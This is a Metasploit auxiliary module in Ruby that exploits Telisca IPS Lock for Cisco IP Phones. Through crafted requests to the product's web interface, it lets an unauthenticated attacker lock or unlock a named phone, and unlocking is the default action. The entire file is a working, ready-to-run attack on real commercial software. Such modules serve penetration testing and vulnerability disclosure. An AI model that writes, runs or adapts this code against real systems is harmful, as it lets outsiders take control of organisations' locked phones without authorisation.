##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Telisca IPS Lock Cisco IP Phone Control',
      'Description'    => %q{
        This module allows an unauthenticated attacker to exercise the
        "Lock" and "Unlock" functionality of Telisca IPS Lock for Cisco IP
        Phones. This module should be run in the VoIP VLAN, and requires
        knowledge of the target phone's name (for example, SEP002497AB1D4B).

        Set ACTION to either LOCK or UNLOCK. UNLOCK is the default.
      },
      'References'     =>
        [
          # Publicly disclosed via Metaploit PR
          'URL', 'https://github.com/rapid7/metasploit-framework/pull/6470'
        ],
      'Author'         =>
        [
          'Fakhir Karim Reda <karim.fakhir[at]gmail.com>',
          'zirsalem'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Dec 17 2015',
      'Actions'        =>
       [
         ['LOCK', 'Description' => 'To lock a phone'],
         ['UNLOCK', 'Description' => 'To unlock a phone']
       ],
       'DefaultAction' => 'UNLOCK'
    ))

    register_options(
      [
        OptAddress.new('RHOST', [true, 'The IPS Lock IP Address']),
        OptString.new('PHONENAME', [true, 'The name of the target phone'])
      ])

  end

  def print_status(msg='')
    super("#{peer} - #{msg}")
  end

  def print_good(msg='')
    super("#{peer} - #{msg}")
  end

  def print_error(msg='')
    super("#{peer} - #{msg}")
  end

  # Returns the status of the listening port.
  #
  # @return [Boolean] TrueClass if port open, otherwise FalseClass.
  def port_open?
    begin
      res = send_request_raw({'method' => 'GET', 'uri' => '/'})
      return true if res
    rescue ::Rex::ConnectionRefused
      vprint_status("Connection refused")
    rescue ::Rex::ConnectionError
      vprint_error("Connection failed")
    rescue ::OpenSSL::SSL::SSLError
      vprint_error("SSL/TLS connection error")
    end

    false
  end

  # Locks a device.
  #
  # @param phone_name [String] Name of the phone used for the pn parameter.
  #
  # @return [void]
  def lock(phone_name)
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => '/IPSPCFG/user/Default.aspx',
      'headers'   => {
        'Connection' => 'keep-alive',
        'Accept-Language' => 'en-US,en;q=0.5'
      },
      'vars_get'  => {
        'action'  => 'DO',
        'tg' => 'L',
        'pn' => phone_name,
        'dp' => '',
        'gr' => '',
        'gl' => ''
      }
    })

    if res && res.code == 200
      if res.body.include?('Unlock') || res.body.include?('U7LCK')
        print_good("The device #{phone_name} is already locked")
      elsif res.body.include?('unlocked') || res.body.include?('Locking') || res.body.include?('QUIT')
        print_good("Device #{phone_name} successfully locked")
      end
    elsif res
      print_error("Unexpected response #{res.code}")
    else
      print_error('The connection timed out while trying to lock.')
    end
  end


  # Unlocks a phone.
  #
  # @param phone_name [String] Name of the phone used for the pn parameter.
  #
  # @return [void]
  def unlock(phone_name)
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => '/IPSPCFG/user/Default.aspx',
      'headers'   => {
        'Connection' => 'keep-alive',
        'Accept-Language' => 'en-US,en;q=0.5'
      },
      'vars_get' => {
        'action' => 'U7LCK',
        'pn'     => phone_name,
        'dp'     => ''
      }
    })

    if res && res.code == 200
      if res.body.include?('Unlock') || res.body.include?('U7LCK')
        print_good("The device #{phone_name} is already locked")
      elsif res.body.include?('unlocked') || res.body.include?('QUIT')
        print_good("The device #{phone_name} successfully unlocked")
      end
    elsif res
      print_error("Unexpected response #{res.code}")
    else
      print_error('The connection timed out while trying to unlock')
    end
  end


  def run
    unless port_open?
      print_error('The web server is unreachable!')
      return
    end

    phone_name = datastore['PHONENAME']
    case action.name
      when 'LOCK'
        lock(phone_name)
      when 'UNLOCK'
        unlock(phone_name)
    end
  end
end
